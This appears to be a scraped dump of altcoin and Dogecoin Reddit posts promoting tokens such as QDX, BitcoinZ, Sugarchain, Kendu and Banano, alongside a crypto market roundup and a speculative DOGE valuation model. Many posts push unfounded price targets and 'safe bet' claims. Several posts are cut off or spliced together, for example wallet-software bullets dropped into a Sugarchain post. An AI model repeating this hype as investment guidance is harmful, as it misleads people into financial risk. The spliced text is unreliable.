**2) Mining is energy-intensive and often bad for the environment**.. with some studies claiming the electricity needed to mine bitcoin is more than used by 'entire countries'.

**3) There has been a recent rise in self-generating liquidity tokens** that redistribute transaction fees to holders to 'moon which seems to be focused mostly on wealth creation - but what about governance, charities/the environment?

**Summary:**

With so much capital inflows into Cryptocurrencies, a major paradigm shift occurring globally to decentralized ways of living we should be starting to think about how can we use this momentum to do better, right?

\> LOOKING FOR PROJECTS FOCUSED ON ENVIRONMENTAL SUSTAINABILITY, CHARITIES & ETHICAL WORK <

When doing some research, I found one that looks legit and some information about coins that don't consume much energy, would appreciate input or feedback:

***Charity Tokens (here is an awesome one I recently found!):*** [***https://www.milktoken.net/***](https://www.milktoken.net/)

**1) Milk and Butter Token (charity token)** that has already raised $25k (which is awesome given they only have a \~$1m market cap) with Food for Life Charity Global (which has projects occupying over 60 countries and volunteers who provide up to 2,000,000 free meals daily!). 

Looks like the token gathers fees on every Butter transaction and the holders of the Butter token can then use their tokens to cast their vote on which charity should receive the next donation.. Tokens are also deflationary so it looks like holders will be rewarded over time.

**2) Sustainable Coins based on Kilowatt hour (KWh) consumed per transaction**

XRP does 0.0079

Dogecoin 0.12

Cardano 0.5479

If anyone knows of any coins offsetting their energy usage or any awesome charity tokens you guys have found please let me know!",51,2021-05-04 23:39:26,8

**Market Overview**

The crypto market continues its new bull run, which re-commenced in July, hitting a new high of $2.7 trillion. Both Bitcoin and Ether also reached all time highs in October. Binance Coin, Tether and Cardano make up the top five by market cap. The Fear and Greed index currently sits at ‘Greed’, which compares to last week’s ‘Extreme Greed’ and last month’s neutral.

**Trending**

**SEC Approves Bitcoin Futures ETF**

After years of false starts the crypto industry finally got its ETF (Exchange Traded Fund). The SEC approved the ProShare Bitcoin Strategy ETF. After two days on the NYSE ProShare’s ETF became the fastest fund ever to reach $1 billion in assets under management. Physically based bitcoin ETFs, where you invest directly in bitcoin, are still waiting approval, but it is a promising start.

**SEC Chairman claims U.S won’t ban crypto**

It came as a relief to the market when Gensler the Chairman of the SEC declared that the U.S would not ban crypto but would seek to better regulate it. Although the final decision would be up to Congress. That regulation is most likely to be focused on the stablecoin market to begin with.

**Walmart enters crypto**

Walmart shoppers can now buy bitcoin at 200 kiosks in its stores. The test is with Coinstar which offers bitcoin at more than 3,000 kiosks.

**Axie Infinity creator raises $152 million**

Axie Infinity is one of the most popular play-ro-earn games on the blockchain commanding a $38 billion valuation (fully diluted). An Investment in the creator rather than the tokens is a telling sign that the tokens do not represent good value. Avoid for now.

**Memecoin mania**

Shiba Inu, the memcoin named after another dog, saw its token rocket in value before falling back after a comment from Musk that he didn't own any. But that comment didn't stop its rise and it is now valued above Dogecoin at $38 billion. Of course that has reignited the search for the next Doge or Shiba, a search we won't be embarking on.

**Squid Games pump and dump**

A token inspired by the Netflix show Squid Games saw its price spiral upwards by 380,000% on its debut. That upwards momentum continued as the price hit $2,861. However the price came crashing down as the founders cashed out with a $12 million profit and left the ‘project’. That my friends is the danger of investing in memecoins and projects with no fundamentals.

**NFT mania**

Coinbase announced it was launching an NFT marketplace focusing initially on Ethereum based NFTs.

**The good and bad of Robinhood**

Robinhood’s announcement that it was launching a crypto wallet hit the share price of Coinbase particularly after they revealed they had already signed up 1 million people to the upcoming product. However Robinhood suffered its own set back a few days later when it reported its quarterly earnings. The main cause of concern was the fall off in crypto trading from $233 million in the previous quarter to $51 million in the current. The shares tanked.

**USDC finds itself under investigation**

One of the leading stable coins, number two behind Tether, was issued with a subpoena from the SEC back in July, only recently coming to light however. It was also disclosed that the investigation continues. USDC announced it was shifting its reserves to only cash and treasuries. It is expected that the SEC will oversee the stablecoin market in the short term, something which will no doubt send shivers up the spine of Tether.

**Tether’s house of cards**

Last month we reported that the SEC is investigating Tether. This month they were hit with a $42.5 million fine by the CFTC. It was also reported in a Bloomberg expose that billions of dollars of client money has been invested in risky crypto projects, something the team at Tether initially denied but was later confirmed by Celsius who benefited from an investment of $1 billion. This is a devastating revelation and is a sure sign that if there was ever a bank run investors would suffer massive losses.

**New York targets DeFi Lending**

Both Nexus and Celsius received cease and desist letters from the New York Attorney General. Nexus and Celsius are lending platforms targeting private investors.

**Finally...**

A new survey suggests 11.4% of adults around the world own crypto. Nigeria, Malaysia and Australia have the highest rate of adoption. Indonesia, Hong Kong, Singapore, India, Philippines, Mexico and the US make up the top 10.

DOGE,Altcoin,Earn cryptocurrencies by selling your old stuff,"Bycryp is a new platform to buy and sell products and services using cryptocurrencies. When a user registers they have access to a wallet compatible with Bitcoin, Ethereum, Bitcoin Cash, Lithecoin, Dogecoin and Monero, from which they can manage their balance, make deposits and withdrawals, and make changes between currencies.

In Bycryp you can earn cryptocurrencies in several ways.

• Publishing ads in which products or services are offered

• Using the Faucet.

• With referrals.

There is also a category called ""Wishlist"" in which a user can publish an ad that includes a link to a product from any internet website indicating in which cryptocurrency he would like to buy it. Another user who wishes to purchase this cryptocurrency can make the purchase in fiat money (euros, dollars ...) and receive in return the cryptocurrencies of the user who published the advertisement. A way to buy cryptocurrencies easily, without commissions and in small amounts.

Now Bycryp gives 3 Dogecoins per ad published so if you have any utensil at home and want to win some crypts you are already taking.

I have decided to make this post is because I want to get the word about our community that many do not realize has grown organically and matured over a period of 5-6 months. We had a surge of sudden traffic recently near end of October where our holders grew from around 3,000 to over 6,100 at the time of writing this up. With the holder growth comes the dramatic price increases and new all-time highs are set and broken again and again. I just ask please have a look at soldoge.io for all the rest of the information.

DOGE,Altcoin,"Angry at what Elon did ? Throw A $BRICK at his FACE! And show him how to make real gains! 🧱 TheCryptoBricks 🧱 is a BSC gaming project inspired by /r/place ! 80K Marketcap, 150+ Holders"," 

Some of you may know the **original** [r/place](https://www.reddit.com/r/place/) project where users were able to **place a pixel on an online canvas and color it** every 10 minutes. Communities of reddit and beyond **massively rallied** to **draw** their **emblems** and various **memes** on it.

To   this day an archive is available where you can see the final canvas   (google it). As you can see there isn't any many cryptocurrencies on it,   not even Dogecoin. It's because [r/place](https://www.reddit.com/r/place/) ended on **april 2017**, the crypto sphere wasn't as active as it is today. Today, the canvas would certainly be massively invaded by memes coins.

Introducing [**thecryptobricks.com**](https://thecryptobricks.com/) and their **#TheCryptoWall** project. It's a blockchain successor to [r/place](https://www.reddit.com/r/place/). This time around, it's not about placing pixels on a canvas, but it's about placing **BRICKS**   that you can color as well (technically the same). The concept is that   each pixel on the website is actually backed by a BEP-20 Token on the   Binance Smart Chain.

What's actually **mind blowing** is that every **BRICK** **must be placed on top of another one** (expect for the bottom ones as explained on the website). This means that **if someone withdraw/sells** their $BRICK, **every BRICKs on top of it will fall**, potentially ruining drawings.

**Just imagine the craziness if a community like** [r/doge](https://www.reddit.com/r/doge/) **would be fighting against the** [r/safemoon](https://www.reddit.com/r/safemoon/) **community.** This will give a **huge incentive** for communities to hold onto theirs **$BRICK**, otherwise drawings will be ruined.

🧱 This could be HUGE since I can't think of any other BSC token with such an original project. 🧱

DOGE,Altcoin,Anyone watching the developments of this gem QDX?," 

I’m always on the lookout for low-priced gems and I’ve been researching an exchange coin called QDX. 

QDX is the exchange token of an African-based exchange called Quidax and that caught my interest because I’ve had some relative success with BNB. So I’m a little biased towards exchange tokens generally. 

I’m kinda impressed with QDX and the exchange offering it.. The exchange (Quidax) was launched in 2018 and has managed to get over 400,000 customers in 72 countries. I also got a video on Youtube where the CEO revealed that the exchange had processed over $3 billion during this period.  

I thought that was cool for a relatively smaller exchange. I looked it up and I realized that it is based in Nigeria which is the largest Bitcoin market in Africa so these numbers could be legit. Plus they had an IDO on JulSwap in May. 

I’ve used Julswap once or twice so I got about $50 worth of QDX. Although I haven’t made a ton of profit I’ve been impressed with the level of development on the project. So far so good.

They’ve partnered with Chainalysis, WallStreetGaming token, and Julswap within the space of three weeks. They also listed BNB and Dogecoin in June. 

I’m curious about trying out their upcoming staking service called QDX Vault. From what I have read, it’s a pretty simple staking model for airdrops. They also plan to list about 100 tokens in the next few months so I guess we’ll see where this goes. 

You can check out the token on coinmarketcap [https://coinmarketcap.com/currencies/quidax/](https://coinmarketcap.com/currencies/quidax/)  or coingecko [https://www.coingecko.com/en/coins/quidax](https://www.coingecko.com/en/coins/quidax). You can get more information on Quidax and the QDX token on the Website: [http://www.quidax.com](http://www.quidax.com/) 

I would also love comments from anyone that has heard about the project, let me know what you think..",0,2021-06-15 01:52:54,1

DOGE,Altcoin,The Dot-Com bubble,"First of all i’m not a native, so sorry for the low level of english.
Anyway let’s start.
I report the article of Wikipedia (here is the link https://en.wikipedia.org/wiki/Dot-com_bubble )

“many investors were eager to invest, at any valuation, in any dot-com company, especially if it had one of the Internet-related prefixes or a "".com"" suffix in its name. Venture capital was easy to raise. Investment banks, which profited significantly from initial public offerings (IPO), fueled speculation and encouraged investment in technology. A combination of rapidly increasing stock prices in the quaternary sector of the economy and confidence that the companies would turn future profits created an environment in which many investors were willing to overlook traditional metrics, such as the price–earnings ratio, and base confidence on technological advancements, leading to a stock market bubble.Between 1995 and 2000, the Nasdaq Composite stock market index rose 400%. It reached a price–earnings ratio of 200, dwarfing the peak price–earnings ratio of 80 for the Japanese Nikkei 225 during the Japanese asset price bubble of 1991. In 1999, shares of Qualcomm rose in value by 2,619%, 12 other large-cap stocks each rose over 1,000% in value, and seven additional large-cap stocks each rose over 900% in value. Even though the Nasdaq Composite rose 85.6% and the S&P 500 rose 19.5% in 1999, more stocks fell in value than rose in value as investors sold stocks in slower growing companies to invest in Internet”

“At the height of the boom, it was possible for a promising dot-com company to become a public company via an IPO and raise a substantial amount of money even if it had never made a profit—or, in some cases, realized any material revenue. People who received employee stock options became instant paper millionaires when their companies executed IPOs; however, most employees were barred from selling shares immediately due to lock-up periods.[12][page needed] The most successful entrepreneurs, such as Mark Cuban, sold their shares or entered into hedges to protect their gains. Sir John Templeton successfully shorted stocks at the peak of the bubble during what he called ""temporary insanity"" and a ""once-in-a-lifetime opportunity"", shorting stocks just before the expiration of lockup periods ending 6 months after initial public offerings.”

As internet at the time was representing the future, (the same way cryptocurrencies represent the future now) any junk project, e-commerce, etc.  became an object of speculation because each, in his own little world, represented the future. (and here dogecoin is like: why the fuck are you talking about me?)
When the bubble burst most of the dot-coms closed.

The difference between then and today is the internet, and more specifically the social networks. Here, with social media and internet, what could then have been more limited, now comes to everyone's hands.

History repeats. Stay safe.
Bet on valid projects and you will have no problems.",5,2021-05-03 16:14:05,1

BITCOINZ IS BITCOIN 2.0

\- Bitcoin technology

\- Anonymous transactions (zk-SNARKs privacy)

\- Bitcoin has all transactions publicly available.

\- decentralized GPU mining (ASIC miners are banned, hardforks to prevent ASIC miners are allowed)

\- Decentralized development / All contributors are volunteers

\- Big blocks -> blocks are similar to BCH

The goal is to port all best free software on the market to be able to use in BitcoinZ.

Immutable params:

\- Mineable ⛏️

\- Max supply

\- Inflation

\- Only POW algo - we may change Zhash algo to other POW algo to prevent ASIC miners

\- New features are allowed to improve usage / scalability, but we will never change history (ETH/ETC case)

Algo: Zhash (always GPU mining - we promote decentralization in mining)

Max supply 21B coins

Current supply: 12,500 coins every 2.5 minutes

Current block size is similar to BCH (BTCZ = 2MB every 2.5 mins \~ BCH = 8MB every 10 min)

I am not affiliated with Btcz, but the team really does make you feel like family. Every decision they make is ran through us first and no decision is agreed on without the whole community backing it.

I personally have never felt so connected to a coin, this is what crypto SHOULD be. 100% decentralized and not ran by some billion dollar company looking out for themselves. If dogecoin can be worth 40 cents without any real case uses, imagine what BTCZ could reach.

DOGE,Altcoin,Only CPU mining - own blockchain - Sugarchain,"[Sugarchain website](https://sugarchain.org/)

 Telegram: [https://t.me/sugarchain](https://t.me/sugarchain)

Sugarchain is a decentralized, peer-to-peer (P2P) digital currency and payment network supported by an open-source blockchain protocol, launched by Zenny Kim and Volodymyr Biloshytskyi on August 24, 2019 [\[1\]](https://sugarchain.org/#bitcointalk). Through Sugarchain, users can make payments to anyone in the world at the highest speeds ***in 5 seconds***, and the lowest costs compared to other digital assets. For example, the transaction speed of Sugarchain is 120 times faster than Bitcoin, 30 times faster than Litecoin and 12 times faster than Dogecoin.

The Sugarchain Project emerged as an alternative solution to Bitcoin in light of early concerns over Bitcoin’s wait times in confirming block transactions and rounding errors in block reward halving. By introducing minor technical modifications to the original Bitcoin source code, Sugarchain allowed for much faster transaction speeds, even lower processing fees and has ***the most accurate block reward halving and total supply*** than any other digital asset, including Bitcoin. Sugarchain also launched following the ***one-CPU-one-vote*** idea proposed by Satoshi Nakamoto himself, thus making YespowerSugar GPU and ASIC resistant. It has also launched as being the first blockchain to have ***Native SegWit (Bech32)*** enabled by default.

As one of the successful derivatives of Bitcoin, Sugarchain is establishing its position as ***the world's fastest PoW blockchain***, complementing and reinforcing Bitcoin in purpose, function, and utility, and challenging our traditional notions of money. The Sugarchain Project has ***never been funded through an ICO or premine***, making it a fair launch. Sugarchain is an entirely community and voluntarily driven project, with no external company or funding supporting it apart from community funding.

&#x200B;

Block time: 5 Seconds

Block reward: 42.94967296 SUGAR

Halving interval: 12,500,000 Blocks (approx. 2 years)

Total supply: 1,073,741,824 SUGAR

 * The key pairs are stored in an sqlite database which is AES encrypted when not in use.
 
 * There is optional BIP38 encryption and decryption available for all currency pairs.
 
 * New currencies can be added to the system by scanning an example private key
 
For more information, take a look at the website [http://inuit-wallet.co.uk](http://inuit-wallet.co.uk)

inuit is written in Python and the source code is available on [github](https://github.com/inuitwallet/inuit). It is still in active development and features will be added as time and demand allow.

I hope you find inuit as useful as I do. If you have any questions or suggestions, leave a comment on the website or email (details on the website)",9,2014-04-08 12:54:43,13
DOGE,Altcoin,Looking to mine new altcoins,"Hey everyone! I'm looking to mine new altcoins. I got into cryptocurrency originally by mining Dogecoin and I'm looking to start mining again. I'm currently researching a new GPU rig, however I'm looking for a coin (or coins) to mine. Is there a website anywhere which lists new coin release dates for mining please? I want to be able to research what the coin does and why, then get ready to mine coins early when they are released, but I cannot seem to find anywhere to do this! I only seem to find news articles and very convoluted forums. Others have suggested Nicehash however I'm looking for coins with potential to grow, not just coins which are profitable currently and established.

DOGE,Altcoin,"Cryptos flagged as potential opportunities from analyzing reddit data, week ending 2018-02-24","Here are this week's stats on the most discussed cryptos on reddit! 

**Update this week**: I’m working on an indicator that flags cryptocurrencies that are being mentioned on reddit for the first time, to expose potential investment opportunities earlier. In backtesting, the indicator was able to flag NEO/Antshares in July 2017, Vechain in October 2017, and ICON in November 2017: all three went onto 10x in price. I’m sharing the cryptos flagged this week below.

**Background**: I wrote a program that scrapes reddit posts from r/cryptocurrency and r/altcoin, and calculates how much certain cryptocurrencies are mentioned, to help give an early indication of the next potential 10x crypto. Crowd sentiment has proven to be a good place to start for more research. I'm always working to make my insights more useful so please reach out with any comments, and stay tuned for updates!

If you prefer to follow along via email and get more kinds of insights every week, you can do so [here](https://www.cryptomintclub.com/).

**Note**: *always* do your own research. Not all cryptos with a lot of mentions are being talked about for good/positive reasons (e.g. BitConnect). Keep reading for info on getting a list of all recent posts so you can browse the headlines and gauge sentiment. Sentiment is also only one piece of the puzzle: fundamental research on the project and team itself is required to make a good investment decision.

**RECENTLY TRENDING CRYPTOS**


**Highlights:**

1. This week, a high throughput blockchain platform (**Zilliqa**), a blockchain powered internet, operating system, and runtime for dApps (**Elastos**), and a blockchain project for crypto-asset and other digital information inheritance (**DigiPulse**) appeared on our list of cryptos that the community is talking more about for the first time. All three are recent ICOs.

2. The founder of **Nebulas**, who is also a former co-founder of NEO/Antshares, did an AMA this week [here](https://www.np.reddit.com/r/nebulas/comments/7zci43/first_live_reddit_ama_with_nebulas_founder/).

3. **Nano's** price is rebounding after a string of positive news: a new core update, a new Android wallet, and news of Twitch streamers accepting donations in Nano.

DOGE,Altcoin,MantleMiner 1.0,"I have read a lot of posts recently about how to better secure the future of Litecoin and other scrypt based altcoins. If any coins are going to try to take on bitcoin the main difference they need is they need to be user friendly. Nothing in the cryptocoin world is really user friendly aside from shiny enchanges and android wallets. To secure our future we will also need to cater to the “common people”. Adaption is spured by the people mining the coins. If and when ASICs come to scrypt the mining of the coins will be taken away from the common person and given to those few that are able to afford these machines. The more we have mining the coins the more people will want in on using the coins, which will require user friendly mining software and wallet software. Since the most widely used program to mine Litecoin and other alts is CG Miner 3.7.2 and it has been abandoned for some time. A new program needs to be created that can expel the full potential of scrypt. OpenGL was that API that has been in use for both Bitcoin and Litecoin, but a new api that AMD designed in house to work hand in hand at the most basic level inside the GPU should be used for the new mining software. This new architecture is Mantle.

Mantle Miner 1.0
Optimized for AMD GCN architecture of graphics cards. 
Maximize scrypt potential for AMD cards. 
Abandon OpenCL in adoption for AMD’s Mantle API. 
Require hardware signature verification. (If this new software allows you to mine at a 15% increased hashrate, why give it to the asic machines?) “Optimization Runtime Mode” to automatically tweak settings for highest hashrate. (I have spent months tweaking cards to achieve maximum hash/power. I have used that knowledge to start development on a tumbler style system changes settings and looks for highest achieved hash at lowest hash to core/mem clock ratio). 
Integration of basic litecoin qt wallet. 
A GUI that is intuitive and easy to use, allowing even your dad to start mining cryptocoins.

What we NEED:
I have carnal knowledge of the inner workings of Mantle ;) but I will need other programmers fluent in C and Java to pull this off. Please post your qualifications here. I would like to crowd fund it with crypto donations and will use that to pay for assignments given so your time and knowledge will be paid for. All suggestions are welcome, lets make some changes!

**Why should you mine Altcoin?**

1. Unique Value Proposition - Altcoin is the first alternative to Bitcoin that serves a purpose: to simplify the entire Altcoin market and allow everyone to finally focus on ONE coin. 

2. Faster Transactions - Because so many people will simplify their lives by mining Altcoin instead of other coins, you can count on a robust and fast network of miners to process everything quickly.

3. Higher Security - Have YOU ever validated the code of your altcoin wallets. Who knows what kind of backdoors and viruses they install!?

4. Lower Overhead - If you run a mining farm, then you know that pointing your farm at the latest trendy virtual currency is a pain in the toosh. Now you can stop wondering if each pool is real, or whether you'll be scammed somehow for each new coin. Just mine Altcoin!

5. Compatibility - Altcoin uses SHA256, which is supported by most cryptocurrency miners in the world!



**Proof of Work Algorithm:** SHA256

**Block Rate (in seconds):** 512

**Initial value per block:** 512

**Block halving rate:** 262,144

**Maximum coins:** 268,435,456 ATC

DOGE,Altcoin,What exchanges were popular in 2013-2014,I was into dogecoin mining in early 2014. I kept my wallet and found 15K doge in there and thought I probably had quite a few still on some exchange sites. I think i had some on cryptsy.com but i saw they no longer exist.

I don't understand why anyone would ever buy into 90% of the coins out today.  There is a huge movement to legalize marijuana worldwide Places like Colorado that have legalized it have huge problems with the dispensaries have no where to place their money.  I am very pro bitcoin and altcoins but I think they need to have a place.  I am personally in potcoin because it is helping to solve a problem, its not just some silly name with the hopes of ""going to the moon"" The majority of Americans support legalizing marijuana even if they dont smoke it.  I would love to hear opinions on here both pro and negative about potcoin.  I strongly believe 2014 will go down as the year of the ALTCOIN as 2013 was bitcoin year.

DOGE,Altcoin,Switching to Gridcoin,"I just posted something similar in r/Gridcoin. I have been feeling really good about mining Gridcoin so i figured i would share the post with the rest of the altcoin community. I am also interested if anyone disagrees with me, and why.

I've been an miner for a few years at the point. I primarily mined scrypt coins and have basically been able to pay for my equipment with mining (so, not much profit). To be honest, the experience has been more mentally enriching than fiscally. It introduced me to different aspects of computing and networking that I was not originally familiar with.  
  
I enjoy mining as a hobby, but I think that Gridcoin, unlike other cryptocurrencies, has an intrinsically valuable purpose. Regardless of whether the price goes up or down, the work itself is what is meaningful and the value of the coin will never go down. There is never ending demand for Gridcoin, as there is a never ending demand for scientific research to be completed. Why not get credit for your work?  
  
I sincerely hope more projects, especially from different fields of scientific research, become available on BOINC. It would inspire a lot of new miners to contribute to the cause and, overall, increase social awareness about new and current scientific research and advancements.  
  
My coin of choice is now Gridcoin (insert Dos Equis meme guy below). I took the bread and the lamb spread and put it all green. The price went up earlier than I wanted before was able to get in on it. However, I am very confident with the help of SETI, Gridcoin will be shooting for the stars (Dogecoin only goes to the moon). I hope to see you guys there. ",7,2015-10-25 15:04:08,3

DOGE,Altcoin,6 simple steps to get rich quick with new Altcoins,"In early December 2013, I visited for the first time bitcointalk forum and reddit. Out of curiosity I checked alternate cryptocurrencies thread and found a notification about the release of the new cryptocurrency called Dogecoin (https://bitcointalk.org/index.php?topic=361813.0). Although the name was strange (still do not know how to pronounce it lol), and the official logo resembled a dog, I decided to dig up some coins. Because the computing power of my laptop was low, I decided to look for an alternative. Through trial and error, I finally figured how to increase my hashrate by using cloud servers. After 3 days of mining I collected over 6 000 000 dogecoins. What now? How and whether at all will I be able to monetize it? Because at that time I had more questions than answers, I decided to encrypt my wallet and forget about it for a few months. On 20th of January I read on reddit about enthusiastic fundraisers that have raised more than 26m in Dogecoin, a joke alternative currency, which could help propel the Jamaican bobsleigh team to the 2014 Winter Olympics. Within the next few days I registered on cryptsy.com and bter.com and traded all my dogecoins to bitcoins so I can exchange it to cash. No magic. Simple as that. By repeating this process for all new scrypt based cryptocurrencies (mining the largest possible number of coins in the initial phase of its existence), you can easily and quickly make money. Using this technique I earned more than $10000 in 6 weeks by investing $20 and 3 hours of my free time.

\* Shib OGs are involved.

\* Kendu's dev is friends with the Shib dev.

\* Organic community that avoids gambling, promotes the project themselves while holding long-term (""diamond handing""), working together as one without relying on external support.

\* No paid marketing tactics like pump-and-dump schemes affecting us.

\* Experienced dev managing the project well, with additional focus on work and sentiment.

\* No exchanges are paid to list our coin; they approach us to buy Kendu at market price. Kendu is listed on over 14 exchanges.

\* Despite market downturns, we've grown to over 12,000 holders and continue to grow steadily.

\* In June, Kendu was the top gainer according to Crypto Research (\[[https://x.com/CryptoRResearch/status/1808513629815447683/photo/1\](https://x.com/CryptoRResearch/status/1808513629815447683/photo/1)](https://x.com/CryptoRResearch/status/1808513629815447683/photo/1](https://x.com/CryptoRResearch/status/1808513629815447683/photo/1))), proving our strategy works.

Now is a great time to buy Kendu. After doing your own research (DYOR), there's no reason not to get involved.

Reaching 40-50 billion levels is achievable for Kendu, given strong sentiment and growing interest in the crypto market.

Kendu offers a safe bet with strong conviction for moonshot potential.

DOGE,Altcoin,A DOGE’s Mediocre Rise,"🚀 DOGE to the Moon! Market Cap Hits $42 Billion as Price Soars to $0.30 📈✨

By Bitlender, Investigative Blogger/Technical Analyst 📊

Dogecoin (DOGE) has taken the crypto world by storm once again! With a 92% price surge in a week, this meme coin has soared past $0.30, becoming the 6th largest cryptocurrency by market cap, beating XRP and USDC! Let’s dig into what’s driving this rally and where DOGE might go next. 🚀🐕💥

Key Stats and Market Momentum 📊🔥

	1.	Market Cap: $42.3 billion, ranking 6th in crypto.
	2.	Price Surge: Over 90%, pushing DOGE above $0.30 📈.
	3.	Trading Volume: Up 220%, hitting $16.8 billion daily.
	4.	Liquidations: $64M liquidated, with $36M in shorts closed 💸.

DOGE’s rally aligns with a broader crypto surge and recent optimism following Trump’s election win. Meme coins like SHIB and PEPE also gained this week, adding fuel to the DOGE hype! 🐕‍🦺💥

Technical Analysis 🔍: Support & Resistance 📉📈

	•	Support: $0.2800 and $0.2614 – Crucial levels if DOGE retraces 📉.
	•	Resistance: $0.3000 and $0.3034 – Breaking above could push further gains 🎯.

DOGE’s recent climb through $0.220 resistance, reaching a high of $0.3034, shows bullish strength, with consolidation hinting that buyers are still engaged.

Volume and Indicators 🔄💹

A Rising Wedge Pattern hints at potential moves; the MACD stays bullish, and the RSI above 50 shows steady buying interest. DOGE holds above its 100-hour SMA, suggesting market support for potential breakouts. 📊🚦

Fibonacci Extensions: 🚀 $3.95 to $23.26? 🤯💰

Based on Fibonacci levels, DOGE could aim for $3.95 or even $23.26 if current support holds strong.

Conclusion: 🚀 To the Moon or Breather? 🌕🐕

DOGE’s rally reflects renewed interest in meme coins, with indicators showing potential for $0.32. But beware, meme coins swing wildly!

I want Mr. Musk to tweet all day about Dogecoin, and see it go up.

But for whatever reason, he has shown a little apprehension to do so. My hypothesis is that he was sued into oblivion last 2021 cycle post-SNL. I wasn't in DOGE back then, but I saw and remember first-hand the euphoria that occurred when some people I knew turned $300 into $30k. It was also dangerous, as he became a god-like figure in the crypto world.

Basically, I wanna remind everyone why we're here. Sure, Elon is a cool guy (I suppose), but we have SO much more going for DOGE. Back in 2017, we had a 120x, and that was pre-Elon. We shouldn't rely on one guys doing to boost the asset, so chill and touch grass anon.

All I'm saying is, with more global-crypto adoption (X payments, other businesses, potential ETF), to

BE FRICKING READY! My targets suggest \~$3 this cycle :).

DOGE,Altcoin,Banano and the founder of Doge,"Dear altcoiners!

Some meme coins are original - most are not. Seeing a creation date of 2021 probably gives you a clue for  what you\`re up for.

Banano was created april 1st, 2018. The project along with the community has been built for three years and it resembles the early days of doge - even btc. Monkeys create memes, tip each other off and nothing else matters. It has a use case besides holding onto it and hoping for a greater fool to buy you out. Banano is also one of the top contributors to folding@home (medical research).

The reason for this post is the following: [https://www.reddit.com/r/banano/comments/n9oz27/creator\_of\_dogecoin\_here\_was\_told\_to\_check\_this/](https://www.reddit.com/r/banano/comments/n9oz27/creator_of_dogecoin_here_was_told_to_check_this/)

In other words, Banano has and always will be a true meme coin, second only to Doge. Its not about the price, but rather the fun and wholesome community.

DOGE,Altcoin,An Introspective look on Dogecoin's future: $86 DOGE?,"The valuation model is constructed around these main variables:

* Total Value of Products and Services (TVPS): This metric assesses the aggregate value of all goods and services that can be purchased with the currency, providing a direct measure of its economic utility.
* Stock to Flow Ratio (SFR): Calculated as the ratio of total supply to new supply, this metric provides an insight into the currency’s scarcity.
* Total Supply: Represents the aggregate number of currency units currently in circulation.
* New Supply: Fixed annual increase in total supply, adding predictability to the currency's inflation rate.
* Velocity of Money (VOM): Measures the frequency at which each currency unit is used for transactions within a specified timeframe, indicating the liquidity and economic activity of the currency.

The Formula:Coin Value = (TVPS / (Total Supply \* VOM) \* SFRThe Total Value of Products and Services (TVPS) is a crucial metric in determining the value of a coin, especially in frameworks where the coin is used as a medium of exchange within a specific economy or ecosystem. Here’s how it significantly impacts the coin's value:

1. Direct Measure of Economic Utility: TVPS represents the aggregate value of all goods and services that can be bought using the coin over a certain period, usually a year. This measure reflects the economic utility of the coin—how useful it is for actual transactions. A higher TVPS indicates that the coin is widely accepted and used, thereby increasing its practical value.
2. Basis for Demand: The more goods and services a coin can buy, the higher the demand for that coin might be. If a coin is the only or primary means of purchasing significant services and products, its necessity and thus its value would likely increase as more users adopt it for daily transactions.
3. Indicator of Stability and Growth: An increasing TVPS suggests that the economy or ecosystem around the coin is growing. Stability in TVPS or consistent growth can signal to investors and users that the coin is a reliable store of value, potentially driving up its price due to increased confidence.
4. Pricing Mechanism: In a market where multiple currencies (digital or fiat) compete, the TVPS can serve as a crucial differentiator. It helps in pricing the coin relative to others by showcasing its purchasing power parity within its operational ecosystem. If a coin can purchase more or higher-value services and goods compared to another, it can be perceived as having a higher inherent value.
5. Feedback Loop for Development: A robust TVPS can encourage further investments into the services and products priced in the coin. This, in turn, can create a positive feedback loop where increased utility leads to higher demand, which then drives further economic activities denominated in the coin.

In sum, TVPS is not just a reflection of the coin’s current worth but also a forward-looking indicator that can influence investor behavior, user adoption, and overall market dynamics surrounding the coin. By effectively measuring and potentially increasing the TVPS, stakeholders can strategically enhance the perceived and real value of the coin within its operating environment. The Velocity of Money is a critical economic indicator in assessing the value of a coin, especially in systems where the coin functions as an active medium of exchange. Here's a detailed look at how the velocity of money impacts a coin's value:

1. Measurement of Economic Activity: Velocity of money refers to the rate at which money is exchanged from one transaction to another and measures how frequently a unit of currency is used to purchase goods and services within a given time period. High velocity indicates a high level of economic activity, as the currency is quickly changing hands, suggesting strong demand and usage.
2. Influence on Supply and Demand Dynamics: In a cryptocurrency or any monetary system, if the velocity of the currency is high, it implies that each unit of currency is being used repeatedly to facilitate transactions. This can effectively increase the supply of money in circulation without physically increasing the total supply, impacting inflation and the purchasing power of the currency.
3. Indicator of Economic Health and Confidence: A higher velocity of money typically signifies a healthy, active economy where confidence in the stability and utility of the currency is strong. People are more likely to spend the currency rather than hold onto it, which can support a higher valuation as it reflects trust and utility in the medium of exchange.
4. Relationship with Price Levels: According to the equation of exchange in economics, MV=PQ (where M is the money supply, V is the velocity of money, P is the price level, and Q is the output of goods and services), an increase in the velocity of money, assuming a constant money supply, can lead to higher price levels. This relation can also influence the value of the coin, as changes in price levels (inflation or deflation) directly affect how much the coin is worth in terms of purchasing power.

In summary, the velocity of money is a multifaceted indicator that not only reflects the current state of an economy or a specific currency’s ecosystem but also actively influences the perceived and intrinsic value of the coin through its effects on economic activity, supply-demand balances, and inflationary pressures. Understanding and strategically managing this velocity can be key to enhancing a currency’s value and stability.The Stock to Flow Ratio is a significant metric, particularly in the context of commodities like gold and silver, and has been adapted to assess the value of cryptocurrencies like Bitcoin. The SFR measures the scarcity of a particular asset and is calculated by dividing the total stock (existing supply) by the flow (annual production rate). Here’s how it plays a crucial role in determining a coin's value:

1. Measure of Scarcity: The SFR directly quantifies the scarcity of an asset. A higher ratio indicates that the asset is less readily available relative to its production, suggesting greater scarcity. For cryptocurrencies, a high SFR implies that new coins are being added to the total supply at a slow rate compared to the existing stock, which can enhance the perception of the coin as a scarce resource.
2. Indicator of Value Over Time: Historically, assets with higher SFR (like gold and silver) have maintained their value over long periods due to their scarcity and lower rates of supply expansion. In cryptocurrencies, a rising S2F ratio over time can signal that the coin is becoming increasingly scarce, potentially driving up its value if demand remains steady or increases.
3. Influence on Investor Perception: Investors often view assets with high SFR as ""harder"" assets. In the realm of cryptocurrencies, a high SFR can attract investors looking for assets that are less susceptible to inflation or dilution, much like traditional store-of-value assets such as gold.
4. Predictive Power for Future Prices: Some models, particularly those applied to Bitcoin, have used the SFR to predict future price increases. These models assume that as the production rate decreases (typically through mechanisms like halving events in Bitcoin), the reduced flow relative to the existing stock will drive up prices.
